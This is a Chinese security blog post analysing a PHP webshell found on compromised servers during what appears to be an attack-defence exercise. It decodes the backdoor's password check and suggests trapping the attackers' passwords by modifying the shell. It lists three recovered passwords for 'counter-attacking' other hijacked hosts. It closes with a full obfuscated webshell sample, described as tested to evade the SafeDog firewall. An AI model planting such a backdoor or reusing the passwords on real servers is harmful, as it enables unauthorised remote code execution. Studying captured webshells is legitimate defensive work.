I"Y<p>对我⽅已拿下的攻击方⾁鸡进⾏⽇志、⽂件等分析，发现⼤部分肉鸡的网站根目录都存在 images.php，提取该文件的内容并分析：</p>

<p><img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/2019-08-21/image020.png" alt="img" /></p>

<p>提出较为重要的那一段base64decode后的PHP代码进行分析：</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">@</span><span class="nb">session_start</span><span class="p">();</span><span class="c1">//开启session</span>

<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'code'</span><span class="p">]))</span><span class="nb">substr</span><span class="p">(</span><span class="nb">sha1</span><span class="p">(</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'a'</span><span class="p">])),</span><span class="mi">36</span><span class="p">)</span><span class="o">==</span><span class="s1">'222f'</span><span class="o">&amp;&amp;</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'theCode'</span><span class="p">]</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'code'</span><span class="p">];</span><span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'theCode'</span><span class="p">]))</span><span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'theCode'</span><span class="p">]));</span>
</code></pre></div></div>

<p><strong>代码逻辑</strong>：判断POST请求参数code是否有值，当满足条件时则执行<code class="language-plaintext highlighter-rouge">substr(sha1(md5($_POST['a'])),36)=='222f'&amp;&amp;$_SESSION['theCode']=$_POST['code']</code>，这段代码的意思为将POST请求参数a的值进行md5加密再进行sha1加密，最后从加密后的字符串的第36位开始取值（sha1加密后的值为40位，这里也就是取后4位），当后四位等于<code class="language-plaintext highlighter-rouge">222f</code>的时候条件为真则执行<code class="language-plaintext highlighter-rouge">$_SESSION['theCode']=$_POST['code']</code>（Why？<strong>&amp;&amp;是逻辑与操作，如果&amp;&amp;的前面为false了，后面的就不会执行了，所以在这里也就间接的形成了一种判断从而必须满足后四位等于222f的条件</strong>），最后进入该代码执行：<code class="language-plaintext highlighter-rouge">if(isset($_SESSION['theCode']))@eval(base64_decode($_SESSION['theCode']));</code>，代码如此简单就不再重复描述～</p>

<p>为了满足条件（<code class="language-plaintext highlighter-rouge">substr(sha1(md5($_POST['a'])),36)=='222f'</code>），我们可以采用钓鱼的方式等攻击方人员主动上钩（修改<code class="language-plaintext highlighter-rouge">images.php</code>即可）：</p>

<p><img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/2019-08-21/image021.png" alt="img" /></p>

<p>当攻击方人员主动连接该Webshell时会将POST请求参数a的值写入到<code class="language-plaintext highlighter-rouge">pass.txt</code>中。</p>

<p>但此方法较为被动，我们还可以在本地搭建一个环境搭配Burp去爆破获取后四位为<code class="language-plaintext highlighter-rouge">222f</code>的明文：</p>

<p><img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/2019-08-21/image022.png" alt="img" /></p>

<p><img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/2019-08-21/image023.png" alt="img" /></p>

<p>获得了：<code class="language-plaintext highlighter-rouge">abc123000</code>、<code class="language-plaintext highlighter-rouge">lipeng520</code>、<code class="language-plaintext highlighter-rouge">160376</code>这三个密码，可利用密码对其他的肉鸡再次进行反打。</p>

<p><strong>代码样本</strong>：（测试可过安全狗）</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>

<span class="nv">$CF</span><span class="o">=</span><span class="s1">'c'</span><span class="o">.</span><span class="s1">'r'</span><span class="o">.</span><span class="s1">'e'</span><span class="o">.</span><span class="s1">'a'</span><span class="o">.</span><span class="s1">'t'</span><span class="o">.</span><span class="s1">'e'</span><span class="o">.</span><span class="s1">'_'</span><span class="o">.</span><span class="s1">'f'</span><span class="o">.</span><span class="s1">'u'</span><span class="o">.</span><span class="s1">'n'</span><span class="o">.</span><span class="s1">'c'</span><span class="o">.</span><span class="s1">'t'</span><span class="o">.</span><span class="s1">'i'</span><span class="o">.</span><span class="s1">'o'</span><span class="o">.</span><span class="s1">'n'</span><span class="p">;</span>

<span class="nv">$EB</span><span class="o">=@</span><span class="nv">$CF</span><span class="p">(</span><span class="s1">'$x'</span><span class="p">,</span><span class="s1">'e'</span><span class="o">.</span><span class="s1">'v'</span><span class="o">.</span><span class="s1">'a'</span><span class="o">.</span><span class="s1">'l'</span><span class="o">.</span><span class="s1">'(b'</span><span class="o">.</span><span class="s1">'a'</span><span class="o">.</span><span class="s1">'s'</span><span class="o">.</span><span class="s1">'e'</span><span class="o">.</span><span class="s1">'6'</span><span class="o">.</span><span class="s1">'4'</span><span class="o">.</span><span class="s1">'_'</span><span class="o">.</span><span class="s1">'d'</span><span class="o">.</span><span class="s1">'e'</span><span class="o">.</span><span class="s1">'c'</span><span class="o">.</span><span class="s1">'o'</span><span class="o">.</span><span class="s1">'d'</span><span class="o">.</span><span class="s1">'e($x));'</span><span class="p">);</span>

<span class="nv">$EB</span><span class="p">(</span><span class="s1">'QHNlc3Npb25fc3RhcnQoKTtpZihpc3NldCgkX1BPU1RbJ2NvZGUnXSkpc3Vic3RyKHNoYTEobWQ1KCRfUE9TVFsnYSddKSksMzYpPT0nMjIyZicmJiRfU0VTU0lPTlsndGhlQ29kZSddPSRfUE9TVFsnY29kZSddO2lmKGlzc2V0KCRfU0VTU0lPTlsndGhlQ29kZSddKSlAZXZhbChiYXNlNjRfZGVjb2RlKCRfU0VTU0lPTlsndGhlQ29kZSddKSk7'</span><span class="p">);</span>

<span class="cp">?&gt;</span>
</code></pre></div></div>
:ET